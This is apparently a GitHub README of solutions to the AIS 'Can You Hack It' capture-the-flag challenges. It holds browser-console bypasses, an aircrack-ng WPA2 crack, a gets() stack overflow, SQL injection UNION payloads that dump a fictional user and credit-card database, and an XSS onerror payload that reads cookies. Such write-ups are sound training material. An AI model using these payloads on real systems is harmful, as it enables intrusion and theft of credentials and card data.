# AIS-Can-You-Hack-It-Solutions
Solutions to the AIS Can You Hack It challenges.

## Solutions
### Client-side Protections
#### Disabled (10 points)
The submit button is disabled.
You can either inspect it in the browser and remove the `disabled` property, or run the following command in the console:

```JavaScript
document.querySelector("button[disabled][ref='submitButton']").disabled = false;
```

After the button is enabled, just click it.


#### Button Clicker (15 points)
The "Click me a lot" button needs to be clicked 1000000 times before the Submit button will be accepted.
However looking at the Network tab in the developer tools we can see the source code for `button_clicker.js`, which shows us the number of clicks is tracked with the variable `ButtonClicker_num_clicks`.
There's also an extra security check if we simply set the value to greater than 1000000 without clicking the button: a local storage boolean `"ButtonClicker_hacking_detected"` which is set to `true` every 100ms with a timer `ButtonClicker_timerId`.

We can bypass both with the following command in the console:

```JavaScript
ButtonClicker_num_clicks = 1000000;
clearInterval(ButtonClicker_timerId);
localStorage.setItem("ButtonClicker_hacking_detected", false);
```

Then just click submit.


#### Weird Input (25 points)
Every time we try to enter the requested string, the input values get changed to all `'a'`s.
We can look at the Network tab in the developer tools and see the source code for `weird_input.js`, which shows us the function `WeirdInput_handle_input` is changing the values.
We could override this function, or more easily override the submit function with the following command in the console:


```JavaScript
function WeirdInput_submit(tag) {
    let input = $(tag.refs.answer);
    input.val(document.querySelector("code").textContent);
    let promise = $.Deferred();
    return promise.resolve();
}
```

After which we can just click submit.


#### Paid Content (50 points)
Clearly we need to flip come variable to say we are a paid user. But where? Looking for a source js file for this challenge turns out it's quite well obfuscated.
However, if we click the submit button we see a POST request is sent, and we can inspect the payload in the Network tab.
We see it contains an `"answer"` key, which contains a string of a JSON. Amongst the keys of this JSON is `"paid"` which is a boolean set to `false`.
So to hack this challenge we can copy the same request, but change the `"paid"` value to `true`.
We can do this by just right-clicking the request in the Network tab and choosing Copy > Copy as fetch.
The `"answer"` field is in the request `"body"` and is url encoded. So look for the subsgtring `"%22paid%22%3Afalse"`, which decodes to `"paid":false` and replace it with `"%22paid%22%3Atrue"`"
Execute the fetch command in the Console tab, then refresh the page to complete the challenge.


### Programming
#### Birthday (15 points)
Clicking the "Submit" button doesn't work, and looking at birthday.js we see there is a `Birthday_submit` function which first checks the `sha256` hashof the current date to the birthday's hash before submitting it. Overriding this to force a submit doesn't work.
But this means we have a `sha256` hash value that will match the birthday string. With 365 possible birthdays per year, this means there are less than 36500 in the last hundred years, so we cna easily brute force a solutions.
We can do this by running the following command in the console:

```JavaScript
for(var idd=0; idd<31; idd++){
    for(var imm=0;imm<=12;imm++){
        for(var iyyyy=2024;iyyyy>=1900;iyyyy--){
            var dd = String(idd).padStart(2, '0');
            var mm = String(imm).padStart(2, '0'); //January is 0!
            var yyyy = iyyyy;
            today = `${mm}/${dd}/${yyyy}`;
            
            var result = sha256(today.toString());
        
            if (result === Birthday_date_hash){
                console.log(today);
                birthday = today;
            }
        }
    }
}
```

And we can finish up by overriding the `Birthday_get_today` function to return the value we found:

```JavaScript
function Birthday_get_today() {
    return today;
}
```

After which we can just click submit.


#### Secure OTP (75 points)
It seems a new random 6-digit OTP is generated every minute, and we don't have access to the phone receiving the OTP. When we try brute-forcing we're blocked, so it seems an impossible task.
However, if we click the "Submit" button, sending a bad submit, we'll get the following hints:
- In the console log we get the following message: `[MySecureOTP][DEBUG]: TODO REMOVE THIS: Seed is: 1705355344`, so we have the seed value for the random number generator, so if we can figure out which random number generator is being used, and how it's used to construct the OTP, then we could solve the puzzle.
- If we send if a few bad submits we get an error message in the GUI saying `"Hint: Each digit of the OTP is chosen randomly with randint(0, 9) from left to right."`, since `randint` is a Python function we should try that.

Looking through the source on `secure_otp.js` we can figure out another quick way to get the seed, with the following command in the console:

```JavaScript
console.log($("#" + SecureOTP_oid)[0]._tag.challenge.seed);
```

Now using a Python shell we can run the following command to implement the hints we received:

```Python
seed = 1705355344 # change this to whatever seed value you have
import random
random.seed(seed)
print(''.join(map(str,[random.randint(0, 9) for i in range(6)])))
```

Pasting the result into the OTP box and pressing the "Submit" button completes the challenge.
Make sure to not let the time run out between getting the `seed` value and submitting the answer.


#### Code Breaker (150 points)
The instructions are pretty straightforeward. After opening the problem the Console also has a messaging telling us to use `CodeBreaker_submit(code)` to submit programmatically.
The following command will crack the code:

```JavaScript
async function break_code(){
    var res = "0000000";
    var score = await CodeBreaker_submit(res);
    for(var i = 0; i < 7; i++){
        for (var d = 0; d < 10 + 26*2; d++){
            var v = String(d);
            if (d >= 10) v = String.fromCharCode(d-10+'a'.charCodeAt(0));
            if (d >= 10+26) v = String.fromCharCode(d-10-26+'A'.charCodeAt(0));
            res = res.substring(0, i) + v + res.substring(i+1);
            var val = await CodeBreaker_submit(res);
            console.log(res);
            console.log(val);
            if (val > score){
                score = val;
                break;
            }
        }
    }
    console.log("Complete. Code is:");
    console.log(res);
    return res;
}
```

The code will also submit, so there's nothing else to do!


#### Tiles (250 points)
Here we have a 5x5 sliding tile puzzle which needs to be solved in under 2 minutes, and with less than 350 moves. Very difficult for a human to achieve.
As it turns out, the search space size (`(5*5)!`) makes it difficult for most search algorithms we throw at it.
However I found using some human-style analysis to get the puzzle close to a finished state, then throwing A-star search at it works pretty well.

Start off by grabbing the board state in a list-of-lists format. We can do this with the following snippet of JavaScript in the console:

```JavaScript
console.log(JSON.stringify(Tiles_getGameBoard()));
```

Then use the SlidingTileSolver.ipynb Jupyter Notebook to run the algorithms for solving the problem. A description of how the algorithms work is inside the notebook.

The result will be a comma-separated string of moves, with can be pasted into the input box and clicking the Submit button completes it.


### Networking
#### HTTP Basic (15 points)
The standard tools for analyzing pcaps is Wireshark. We can use the commandline tool `tshark`.
Documentation is [here](https://www.wireshark.org/docs/man-pages/tshark.html).

In particular we'll want to find all HTTP requests with a body, i.e. POST requests, and extract the body and look for the username and password.


```Bash
tshark -r http-auth.cap -Y "http.request.method == POST" -T fields -e text
```

- `-r` is to read the .cap file.
- `-Y` is the filter the packets, in this case to POST requests.
- `-T` is specify the output format, in this case the fields
	- `-e` is to specificly out them as plain text.

Or for a more legible output:

```Bash
tshark -r http-auth.cap -Y "http.request.method == POST" -T fields -e urlencoded-form.key -e urlencoded-form.value | python3.11 -c "import sys;[print('\n'.join(map(': '.join,zip(*[col.split(',') for col in line.split('\t')])))) for line in sys.stdin.read().splitlines()]"
```

From this output we can get the form values, and see the fields `"name"` and `"pass"`, from which we get out answer.
Just past them in and click Submit.


#### WPA2 Deauth
This time we are asked to crack a WPA2 handshake from the wifi using the pcap.
The main tool used to do this is `aircrack-ng`, though it requires a wordlist for its cracking.
A popular choice is the RockYou password list, which can be downloaded [here](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt).
Afterwards just run the command:


```Bash
aircrack-ng -w rockyou.txt de-auth.cap 
```

It should first present the MAC address (BSSID) and the SID (ESSID), before starting the crack, which should take a few minutes before presenting the password.


### Reverse Engineering
#### Baby's First RE (25 points)
The standard tool for analyzing binaries is Ghidra.
Documentation is [here](https://ghidra-sre.org/).

Decompiling the `babysfirst` binary with Ghidra shows the `main` contains this code:

```C
  iVar1 = strncmp("bin-continu",(char *)&local_1c,0xb);
  if (iVar1 == 0) {
    puts("You did it!");
  }
  else {
    puts("Nope :(");
  }
```

So the user input is compared to the string `"bin-continu"`, which is the password.


#### Defeating Dr. D. Bugg (50 points)
This time we need to figure out which capitalization of the password command "quietrobotplease" will turn out completely lower case after going through the scrambling program.

If we look at the strings we will see under `DOCTOR_DASTARDLY_BUGGS_JOURNAL`

```
AAAAAAAAH
AAAAAAAAH
My evil plan is finally complete! My robot will destroy everything! I gave out the command for deactivation, as well as the command transmitter, but the transmitter will change any commands to be shouted at the robot! And the robot ignores any commands that are shouted at it, because it only accepts commands from polite people! I left in 2 working command capitalization combinations so that I may deactivate the robot at some point, but nobody will ever figure either of them out! Mwahahahahaha!
Note to self (the handsome Dr. Dastardly): remember not to compile the command transmitter in debug mode when you give it away, or else your variable names will be on full display! And fix that bad habit of using strings as documentation!
D Bugg Documentation: The scrambling is based on the formula: (n*13+7)mod16=result. The numbers 13 and 7 are crucial, so make sure nobody finds them out!
D Bugg Documentation: Do not let users try to trick the system! Away with all wrong-length commands!
D Bugg Documentation: This pays attention to both the value of a character and its capitalization. Twice the influences means twice the confusion! Very secure!
```

If we open the program up in Ghidra and do a little work on the main function `command_transmitter` we get the following decompile:

```C
char* command_transmitter(char *param_1)
{
  bool isupper;
  char newchar;
  char c;
  char* __dest;
  size_t length;
  int curr_index;
  int influence_index;
  int next_index;
  
  __dest = (char*)malloc(16);
  length = strlen(param_1);
  if (length == 16) {
    strcpy(__dest,param_1);
    curr_index = 0;
    influence_index = 7;
    next_index = curr_index;
    while (curr_index = next_index, influence_index != 0) {
      influence_index = get_influence_index(curr_index);
      c = param_1[influence_index];
      isupper = char_is_uppercase(c);
      if (isupper) {
        newchar = switch_char_case(__dest[curr_index]);
        __dest[curr_index] = newchar;
      }
      isupper = char_is_even(c);
      next_index = influence_index;
      if (isupper) {
        c = switch_char_case(__dest[curr_index]);
        __dest[curr_index] = c;
      }
    }
  }
  else {
    __dest = fill_string_with_A(__dest);
  }
  return __dest;
}
```

From here we can work things out with the circular chain of dependencies, however, at `2**16 == 65536` possible capitalizations, we can actually brute force this easily.

```C
int main()
{
  char* target = "quietrobotplease";
  char sol[16+1];
  for (int i = 0; i < (1<<16); i++)
  {
    strcpy(sol, target);
    for (int j = 0; j < 16; j++)
      if((1<<j) & i)
        sol[j] = switch_char_case(sol[j]);
    char* scrambled = command_transmitter(sol);
    if (!strcmp(scrambled, target))
      printf("%d: %s -> %.16s\n", i, sol, scrambled);
  }

  return 0;
}
```

The code is all together with the other required decompiled functions in `command-transmitter.c`
Which gives the following 2 solutions:

```
3270: qUIetrOBotPLease -> quietrobotplease
62265: QuiETRobOTplEASE -> quietrobotplease
```


### Steganography
#### Frequency Analysis (25 points)
We are given a file `flagged-waveform` with no file extension, but looking at the file's binary in a hexdump, we quickly see it's starts with the file signature `RIFF` and `WAVEfmt`, indicating it's a `.wav` file, and indeed we can open it with music player apps.
You can find a good list of file signature [here](https://en.wikipedia.org/wiki/List_of_file_signatures).

```Bash
xxd flagged-waveform | head
```

Listening to it, it sounds like a sequence of sine waves of different frequencies. And indeed if we open it with a waveform viewing tool like Audacity, we see exactly that, along with the length of each frequency section being exactly 1s.
We can extract the sequence of frequency values using a Fourier transform tool, in particular we want some kind of spectrograph. A convenient way to to this is with Python's `scipy` library, so we can control exactly for the spectrogram is created and then we can work with the data extracted. In particular, simple converting it to ASCII gives us the flag.
We can use the code below:

```Python
import scipy.io.wavfile
import scipy.signal
rate, data = scipy.io.wavfile.read('flagged-waveform')
f, t, Sxx = scipy.signal.spectrogram(data, fs=rate, nperseg=rate, noverlap=0)
freqs = Sxx.argmax(axis=0)
message = ''.join(map(chr,freqs))
print(message)
```

Or use the FrequencyAnalysisSolver.ipynb Jupyter Notebook to accomplish the same thing, with a Matplotlib visualization of the spectrogram as well.


### Crypto
#### Skip Cipher (25 points)
From the looks of the text and the title, we can conclude that to decrypt the text we need to start with the first letter (which is the only one capitalized after all), then step some number of letters before taking the next letter and repeat until we cover the entire string, wrapping as needed.
The skip stride length should be coprime to the encrypted text so as to hit each letter once, but we can also check each possible stride.
We can get a wordlist of common English words and check which candidate solution contains the most English words, because that's very likely our solution.

Here's the Python code to solve the problem. We can also use the attached SkipCipherSolver.ipynb Jupyter Notebook as well.

```Python
cipher_text = "Irntfsnie  dp aav sgr  en toeedyleh.easosdkhndnesw a"
n = len(cipher_text)

import requests
r = requests.get("https://www.mit.edu/~ecprice/wordlist.10000")
#r = requests.get('https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english.txt')
wordlist = set(r.text.splitlines())

plain_text = ''
wordcount = 0
solution_stride = 0
for stride in range(n):
    decoded = ''.join(cipher_text[(stride*i)%n] for i in range(n))
    decoded_wordcount = sum(w in wordlist for w in decoded.split(' '))
    if decoded_wordcount > wordcount:
        wordcount = decoded_wordcount
        solution_stride = stride
        plain_text = decoded
print('stride:', solution_stride)
print(plain_text)
```


#### Encoded (75 points)
As the hint says, the data isn't encrypted, but is encoded, several times. We need to recognize the forms of encoding in order to decode the flag.

1. The given string contains only digits and letters a-f, which implies it's byte data encoded in hexadecimal. We can use Python's `bytearray.fromhex` to decode to bytes.
2. The bytes starts with the bytes for PK, the file signature for zip files. We can use Python's `zipfile` library, which indeed shows we have a zip archive containing a file `flag.txt`, which contains our next encoded string.
3. The string contains digits, uppercase and lowercase letters, as well as the `+` and `/` characters, which is the set of characters for base64 encoding. We can use Python's `base64` library to decode to bytes.
4. The bytes starts with the bytes for BZhm the file signature for bzip2 compressed data. We can use Python's `bz2` library to decompress to bytes.
5. The bytes are an ascii string for groups of space-separated strings of 1s and 0s. Clearly these represent bytes. With Python we can split the string by spaces and for each binary string interpret it as binary to integer using `int(c,2)`.
6. Interpreting the byte string as ascii contains only digits and letters a-f, which implies it's byte data encoded in hexadecimal, same as step 1. Using Python's `bytearray.fromhex` again, gives us the flag.

The EncodedSolver.ipynb Jupyter Notebook will perform all the steps, and show the outputs after each step.


#### XOR (100 points)
Given the key is 6 characters long, that's 56,800,235,584 possibilities to try, so not impossible to bruteforce, but we can do better by going the other way with a wordlist: checking for candidate common words to recover the key from the ciphertext and check our candidate key decrypts the entire ciphertext into plaintext with common words.

```Python
ciphertext = "205c04451a31015642581e701f5a09544d351d47105e1d2949132b454d39001306580b361a50175d1970075c42561f3100434e111a351a540a424d3e1c470a5803375f13035f09701c5107481e70075b07113e35105c0c554d1c1244425e0b70275b0743003f174a0c50003910405911047e161d4e11042453520e460c2900130b5f0e22165211541e7e"
key_len = 6

hex_data = bytearray.fromhex(ciphertext)
n = len(hex_data)
key_reps = n//6

import requests
r = requests.get('https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english.txt')
wordlist = r.text.splitlines()
wordset = set(wordlist)

key = ''
plaintext = ''
matches = 0
used_word = ''
used_freq = 0
for freq,word in enumerate(wordlist):
    if len(word) >= key_len-2: # use only words, whom with their spaces, will cover the key
        #print(word)
        xor = f" {word} "[:key_len].encode() # use only what's needed to cover the key
        for i in range(n-key_len): # check anywhere in the plaintext
            candidate_key = bytes([k^c for k,c in zip(xor, hex_data[i:i+key_len])])
            candidate_key = candidate_key[key_len-i%key_len:] + candidate_key[:key_len-i%key_len]
            
            candidate_plaintext = bytes([k^c for k,c in zip(candidate_key*key_reps, hex_data)]).decode()
            candidate_matches = len(set(candidate_plaintext.lower().split(' ')) & wordset)
            
            if candidate_matches > matches:
                matches = candidate_matches
                used_word = word
                used_freq = freq
                plaintext = candidate_plaintext
                key = candidate_key

print(f"used word: {used_word}, freq position: {used_freq}/{len(wordlist)}, word matches: {matches}")
print("plaintext:", plaintext)
print("key:", key)
```

The code to do so is in the XORSolver.ipynb Juputer Notebook.


#### ENIGMA (150 points)
To solve this problem I implemeted a very stripped down Enigma I machine simulator. 
Here are the main resources I used to do so:

- https://www.101computing.net/enigma-encoder/
- https://cryptii.com/pipes/enigma-machine
- https://www.cryptomuseum.com/crypto/enigma/i/
- https://www.youtube.com/watch?v=ybkkiGtJmkM&t=923s
- https://github.com/Wikunia/Enigma.jl/tree/master?tab=readme-ov-file

The enigma machine essentially is a series of permutations, with circular offsets applied. So I found it efficient to convert into mod 26 numbers and use lookup arrays.

For the crack, looking in the Console tab of the problem we see we are given some hints: the reflector is given by name, and what are obviously plugboard connections, as well as triplets of numbers fo r the ground settings and ring settings, leaving just the 3 rotors to be unknowns. Which are the ring vs ground settings is unclear, and I was given dates, which could have multiple formats: these are all easy to brute force over.

The next challenge however, was choosing the candidate solution. Because the enigma machine only works on letters, there's no spaces on which to split words and check for valid words.
I therefore implemented a trie to find non-overlapping words. A big issue was finding many small word, therefore score decryptions with mostly nonsensical short word strings. Ultimately I found the solution to was score by largest word found.

In the end I got a quote as the decrypted message, submitting it, without spaces, solved it.

The code to do all ths is in the ENIGMASolver.ipynb Jupyter Notebook, along with some extra notes on the implementation.


### Exploitation
#### Stack Overflow (25 points)
The JS console gives some hints on how to test out the C code by compiling without stack protection.
We can see in the code it uses the `gets` function to obtain input, which is a deprecated function due to it reading input indefinitely until an `EOF` character is reached. This allows us to give more data than the input buffer can take, and therefore overflow the input into other memory on the stack.
The data which will be read into the `password` buffer will overflow into the `authenticated` variable. If we overflow too far we do hit a segmentation fault. Since the size of the `password` buffer is 12, we want to use 13 characters to change the value in `authenticated`.
Since `authenticated` is being checked like a boolean, any value other than `0` will work to obtain success.

Using the input `1234567890ab0` will fill password with the chars `"1234567890ab"` while the `char` `'0'` will be read into `authenticated`, since `authenticated` is an `int` this means `'0'` will be cast to its ASCII value 48.


### Input Validation
#### SQL Login (50 points)
Attempting an SQL injection by escaping the quotes (e.g. input `'`), we get error messages showing the SQL command being executed is: 

```SQL
SELECT username, password FROM users WHERE username='farnsworth' AND password='{INPUT}'
```

Note the `username` in question could be different.
So we can easily escape and use a UNION attack to extract data from the database. The simplest is 

```SQL
' UNION SELECT username,password FROM users WHERE username = 'farnsworth' --
```

Which will show use the password we're looking for, so we can then enter it to complete the challenge.

#### Cross Site Scripting (75 points)
Executing `console.log(document.cookie)` in the Console shows `admin_sess_id=flag_should_be_here%20%F0%9F%A4%94`, which is incorrect. Clearly we need to use XSS to get the true document cookie.
Submitting changes the `src` field of the image to the value given to the "Image URL" field.
Therefore we can inject code to escape the `src` field and use the `onerror` field of `img` tags to execute JavaScript and tell us the cookie.

```JavaScript
" onerror="alert(document.cookie)" dummy="
```

Once we refresh the page and reopen the challenge modal we should see an alert telling up the cookie with the true flag.

#### SQL Credit Cards (100 points)
Similar to the previous SQL challenge, however this time we need to know which column the credit card number will be under, except we don't know which that'll be.
In fact we don't know the database schema at all, and not even the flavor of SQL, so we'll need to do a deeper look into the database.

We can extract more information about the database by first determining which flavor of SQL is being used, which in this case turns out to be SQLite, since it doesn't report an error for using the function `sqlite_version()`. It makes sense for an SQLite instance to be used for a small hacking challenge.
- [Tips For Determining SQL Flavor](https://stackoverflow.com/questions/65306224/determine-flavor-of-sql-being-used)
- [SQL injection payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

We can get the database schema like so:

```SQL
' UNION SELECT sql,NULL FROM sqlite_master WHERE sql NOT NULL --
```

This shows us we have 2 tables:

```SQL
CREATE TABLE credit_cards (username text, card text, cvv integer, exp text)
CREATE TABLE users (username text, password text)
```

And so we can dump the entire database:

```SQL
' UNION SELECT '| ' || rowid || ' | ' || username || ' | ' || password || ' |',NULL FROM users --
```

and

```SQL
' UNION SELECT '| ' || rowid || ' | ' || username || ' | ' || card || ' | ' || cvv || ' | ' || exp || ' |' FROM credit_cards --
```

Which gives us this information:

`users`

| rowid | username | password |
|-|-|-|
| 1 | admin | `Gu3ss_Myp4s%w0rd**` |
| 2 | bender | `b1t3-my-shiny-m3t4l-4$$` |
| 3 | fry | `w4ts-w/-th3-17-dungbeetles` |
| 4 | farnsworth | `P4zuzu!!` |
| 5 | scruffy | `Im_0n-br3ak` |
| 6 | zoidberg | `sp4r3-ch4ng3#$$$` |

`credit_cards`

| rowid | username | card | cvv | exp |
|-|-|-|-|-|
| 1 | admin | 4300713381842928 | 318 | 06/2027 |
| 2 | bender | 4768732694626948 | 669 | 07/2027 |
| 3 | fry | 4385923563192160 | 368 | 11/2021 |
| 4 | farnsworth | 4784981000802194 | 171 | 02/2027 |
| 5 | scruffy | 4987327898009549 | 763 | 11/2019 |
| 6 | zoidberg | 4912753912003772 | 440 | 07/2026 |

We can also more directly complete the challenge:

```SQL
' UNION SELECT card FROM credit_cards WHERE username='farnsworth' --
```

Which will give us the number to submit to complete the challenge.

